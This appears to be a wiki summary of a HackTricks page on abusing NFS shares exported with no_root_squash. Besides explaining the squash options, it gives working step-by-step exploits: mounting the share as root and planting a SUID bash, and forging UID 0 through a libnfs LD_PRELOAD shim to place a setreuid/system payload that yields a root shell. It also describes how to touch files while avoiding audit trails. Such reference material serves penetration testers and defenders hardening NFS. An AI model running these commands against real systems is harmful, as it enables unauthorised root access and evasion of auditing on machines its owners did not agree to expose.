---
title: "HackTricks: NFS no_root_squash Privilege Escalation"
tags: [linux-hardening, privilege-escalation, nfs, suid]
sources: [hacktricks-nfs-no-root-squash.md]
updated: 2026-05-01
---

# HackTricks: NFS no_root_squash Privilege Escalation

Source: [hacktricks-nfs-no-root-squash.md](../../raw/hacktricks-nfs-no-root-squash.md)

## Key Takeaways

NFS trusts the UID/GID declared by the client (without Kerberos). The `/etc/exports` option `no_root_squash` means the NFS server does **not** remap UID 0 to `nobody` — an attacker mounting the share as root can write files owned by root, including SUID binaries.

## Squash Options

| Option                  | Effect                                  |
| ----------------------- | --------------------------------------- |
| `all_squash`            | Maps everyone to `nobody` (UID 65534)   |
| `root_squash` (default) | Only root (UID 0) is mapped to `nobody` |
| `no_root_squash`        | Root is trusted — writes as real UID 0  |

Check: `cat /etc/exports`

## Remote Exploit (attacker has root on another machine)

```bash
# Attacker (as root)
mkdir /tmp/pe
mount -t nfs <victim-IP>:<share-path> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash        # SUID bit

# Victim
cd <shared-folder>
./bash -p            # → root shell
```

Can also copy and SUID a compiled C payload instead of bash.

## Local Exploit (NFS share restricted to specific IP)

When `/etc/exports` has `insecure` flag and an IP restriction, use **libnfs** to forge the UID in NFS RPC calls:

```bash
# Build libnfs with ld_nfs.so shim
./bootstrap && ./configure && make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/

# Compile payload
echo 'int main(void){setreuid(0,0); system("/bin/bash"); return 0;}' > pwn.c
gcc pwn.c -o a.out

# Place on NFS share with fake UID 0
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 ... chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 ... chmod u+s  nfs://nfs-server/nfs_root/a.out

# Execute on victim
/mnt/share/a.out    # → root
```

## Stealthy Access: nfsh.py

After gaining root, interact with NFS files without changing ownership (to avoid audit trails) by dynamically matching the file's UID before each access.

## Related

- [linux-privilege-escalation](../concepts/linux-privilege-escalation.md)
- [HackTricks: Linux Privilege Escalation Checklist](hacktricks-privilege-escalation-checklist.md)
- [HackTricks](../entities/hacktricks.md)
